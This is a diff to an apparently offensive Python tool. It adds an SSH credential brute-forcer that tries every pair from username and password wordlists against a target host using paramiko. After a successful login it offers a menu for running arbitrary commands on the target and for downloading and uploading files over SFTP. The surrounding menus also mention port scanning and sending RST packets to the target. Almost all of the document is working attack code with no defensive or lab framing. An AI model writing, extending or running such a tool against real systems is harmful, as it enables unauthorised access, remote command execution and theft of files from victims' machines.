@@ -171,8 +171,85 @@ def close_port(port):
 
 
 # Definitions. Brute force function.
-def brute_force():
+def brute_force(hostname, port, username, password, sock):
+    # Connecting to server. Trying all combinations.
+    print("\n[+] Executing one of the combinations...")
+    ssh_paramiko_client.connect(hostname=hostname,
+                                port=port,
+                                username=username,
+                                password=password,
+                                timeout=4,
+                                sock=sock)
+    # Print results.
+    print("[+] Successfully connected as:"
+          f"\nUsername: {username}"
+          f"\nPassword: {password}"
+          f"\nTarget IP address: {target_ip}"
+          f"\nPort: {open_port}")
+    # Return value.
+    return True
 
+
+# Definitions. Execute command function.
+def execute_command(command):
+    # Print result.
+    print("\nExecuting command...\n")
+    # Execute command.
+    stdin, stdout, stderr = \
+        ssh_paramiko_client.exec_command(command)
+    # Print result.
+    print("[+] Successfully executed command:"
+          f"\n{stdout.read().decode('utf-8')}")
+    # Return to Main Menu.
+    print("[+] Returning to main menu...")
+    # Return value.
+    return True
+
+
+# Definitions. Download file function.
+def download_file(host_file_path, target_file_path):
+    # Print result.
+    print("\n[+] Please be patient! Downloading...\n")
+    # Open a file.
+    host_file_name = open(host_file_path, "wb")
+    # Open connection to the Target.
+    sftp = ssh_paramiko_client.open_sftp()
+    # Download file.
+    sftp.getfo(target_file_path, host_file_name)
+    # Print result.
+    print("[+] Successfully downloaded:"
+          f"\nfrom: {target_file_path}"
+          f"\nto: {host_file_path}")
+    # Close the file and connection.
+    host_file_name.close()
+    sftp.close()
+    # Print result.
+    print("\n[+] Returning to main menu...\n")
+    # Return value.
+    return True
+
+
+# Definitions. Upload file function.
+def upload_file(host_file_path, target_file_path):
+    # Print result.
+    print("\n[+] Please be patient! Uploading...\n")
+    # Open a file.
+    host_file_name = open(host_file_path, "rb")
+    # Open connection to the Target.
+    sftp = ssh_paramiko_client.open_sftp()
+    # Upload file.
+    sftp.putfo(host_file_name, target_file_path)
+    # Print result.
+    print("[+] Successfully uploaded:"
+          f"\nfrom: {host_file_path}"
+          f"\nto: {target_file_path}")
+    # Close the file and connection.
+    host_file_name.close()
+    sftp.close()
+    # Print result.
+    print("\n[+] Returning to main menu...\n")
+    # Return value.
+    return True
 
 
 # Call Main Function.
@@ -242,7 +319,7 @@ if __name__ == "__main__":
                             third_menu = input("\n=================================================="
                                                "\nMain Menu:"
                                                "\n[1] Scan and send RST packet to the Target."
-                                               "\n[2] Brute force the Target."
+                                               "\n[2] Brute force the credentials."
                                                "\n[3] Quit."
                                                "\nEnter your choice: ")
                             print("==================================================")
@@ -267,6 +344,140 @@ if __name__ == "__main__":
                                       f"\n{closed_ports}")
                                 print("\nClosed ports by RST packet:"
                                       f"\n{closed_ports_by_rst_pkt}")
+                            # Choice 2.
+                            if third_menu == "2":
+                                # Proxy configuration.
+                                proxy = None
+                                # SSH client.
+                                ssh_paramiko_client = paramiko.SSHClient()
+                                ssh_paramiko_client.load_system_host_keys()
+                                ssh_paramiko_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                                # Information about inputs.
+                                print("\n=================================================="
+                                      "\nImportant information!"
+                                      "\n=> if you are working on Windows remember about two backslashes,"
+                                      "\n==================================================")
+                                # Inputs.
+                                usernames_file_list = input("\nEnter path to file with usernames: ")
+                                passwords_file_list = input("\nEnter path to file with passwords: ")
+                                open_port = int(input("\nEnter open port from the list: "))
+                                # Open files.
+                                usernames_list = open(usernames_file_list, "r+")
+                                passwords_list = open(passwords_file_list, "r+")
+                                # Print results.
+                                print("\nPlease be patient! Connecting to the Target...")
+                                # Read lines in the files.
+                                usernames = usernames_list.read().split("\n")
+                                passwords = passwords_list.read().split("\n")
+                                # Usernames loop.
+                                for username in usernames:
+                                    # Passwords loop.
+                                    for password in passwords:
+                                        time.sleep(0.2)
+                                        # Try statement.
+                                        try:
+                                            # Call brute_force function.
+                                            brute_force(target_ip, open_port, username, password, proxy)
+                                            # While loop.
+                                            while True:
+                                                # Fourth Menu.
+                                                fourth_menu = input(
+                                                    "\n=================================================="
+                                                    "\nMain Menu:"
+                                                    "\n[1] Execute command on the Target."
+                                                    "\n[2] Download file from the Target."
+                                                    "\n[3] Upload file to the Target."
+                                                    "\n[4] Quit."
+                                                    "\nEnter your choice: ")
+                                                print("==================================================")
+                                                # Choice 1.
+                                                if fourth_menu == "1":
+                                                    # Try statement.
+                                                    try:
+                                                        # Inputs.
+                                                        command = input("Enter Command: ")
+                                                        # Call execute_command function.
+                                                        execute_command(command)
+                                                        continue
+                                                    # Error handling.
+                                                    except Exception as error:
+                                                        # Print error.
+                                                        print("[-] Unknown Error:"
+                                                              f"\n{error}")
+                                                        continue
+                                                # Choice 2
+                                                elif fourth_menu == "2":
+                                                    # Try statement.
+                                                    try:
+                                                        # Inputs.
+                                                        host_download_file_path = input(
+                                                            "Enter path to your file: ")
+                                                        target_download_file_path = input(
+                                                            "Enter path to your Target file: ")
+                                                        # Call download_file function.
+                                                        download_file(host_download_file_path,
+                                                                      target_download_file_path)
+                                                        continue
+                                                    # Error handling.
+                                                    except Exception as error:
+                                                        # Print error.
+                                                        print("[-] Unknown Error:"
+                                                              f"\n{error}")
+                                                        continue
+                                                # Choice 3
+                                                elif fourth_menu == "3":
+                                                    # Try statement.
+                                                    try:
+                                                        # Inputs.
+                                                        host_upload_file_path = input(
+                                                            "Enter path to your file: ")
+                                                        target_upload_file_path = input(
+                                                            "Enter path to your Target file: ")
+                                                        # Call upload_file function.
+                                                        upload_file(host_upload_file_path,
+                                                                    target_upload_file_path)
+                                                        continue
+                                                    # Error handling.
+                                                    except Exception as error:
+                                                        # Print error.
+                                                        print("[-] Unknown Error:"
+                                                              f"\n{error}")
+                                                        continue
+                                                # Choice 4
+                                                elif fourth_menu == "4":
+                                                    # Print results.
+                                                    print("\n[+] Quitting...")
+                                                    break
+                                                # Invalid choice.
+                                                else:
+                                                    # Invalid choice.
+                                                    print("\n[-] Invalid choice!")
+                                                    continue
+                                            # Breaking the loop.
+                                            break
+                                        # Error handling.
+                                        except paramiko.AuthenticationException as error:
+                                            # Print error.
+                                            print("[-] Authentication Error!"
+                                                  f"\n{error}")
+                                        # Error handling.
+                                        except paramiko.ssh_exception.SSHException as error:
+                                            # Print error.
+                                            print("[-] SSH Error!"
+                                                  f"\n{error}")
+                                        # Error handling.
+                                        except Exception as error:
+                                            # Print error.
+                                            print("[-] Unknown Error:\n"
+                                                  f"\n{error}")
+                                    # Else statement.
+                                    else:
+                                        continue
+                                    # Breaking the loop.
+                                    break
+                                # Closing connection.
+                                usernames_list.close()
+                                passwords_list.close()
                             # Choice 3.
                             elif third_menu == "3":
                                 # Print results.
